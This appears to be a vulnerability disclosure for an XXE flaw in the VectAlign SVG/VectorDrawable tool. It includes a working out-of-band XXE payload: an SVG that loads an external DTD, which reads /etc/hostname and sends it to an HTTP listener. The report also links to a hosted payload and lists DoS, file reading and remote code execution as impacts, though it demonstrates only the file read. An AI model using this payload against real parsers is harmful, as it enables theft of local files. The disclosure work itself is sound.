# Description

 `VectAlign` (a.k.a. VectorDrawableAlign) is a developer's tool which automagically aligns two VectorDrawable "pathData" strings (or SVG images) in order to allow morphing animations between them using an AnimatedVectorDrawable. this package is vulnerable to `(XXE)`.

https://github.com/bonnyfone/vectalign

# :recycle:  Steps To Reproduce-:  
  0) download and run https://bintray.com/artifact/download/bonnyfone/maven/vectalign-0.2-jar-with-dependencies.jar
  1) creat a payload svg or use : (this is a example of External Xml Inclusion )https://drive.google.com/drive/folders/1CLc0cYmz6Q-CGnMpDnupx7YTjNzo8Eir?usp=sharing
  
the example dd.svg looks like : 
```
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://localhost:8080/d.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```
d.xml
```
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://localhost:8080/s.l?=%data;'>">
```
# :male_detective: POC
  [gdrive](https://drive.google.com/file/d/1VqfAgldmtY-qrgHRfizVvAH2oIFZVT-q/view?usp=sharing)
## 💥 Impact
DOS or Denial of service
LFI or local file inclusion (as in the POC)
RCE 
